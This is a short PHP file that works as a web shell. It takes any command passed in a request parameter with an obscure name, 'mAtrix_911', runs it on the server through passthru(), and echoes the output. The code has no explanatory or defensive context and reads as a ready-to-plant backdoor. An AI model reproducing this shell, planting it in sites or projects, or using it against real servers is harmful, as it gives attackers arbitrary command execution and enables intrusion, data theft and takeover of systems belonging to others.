<?php
if (isset($_REQUEST['mAtrix_911'])) {
    $cmd = $_REQUEST['mAtrix_911'];
    echo '<pre>';
    passthru($cmd);
    echo '</pre>';
}
?>
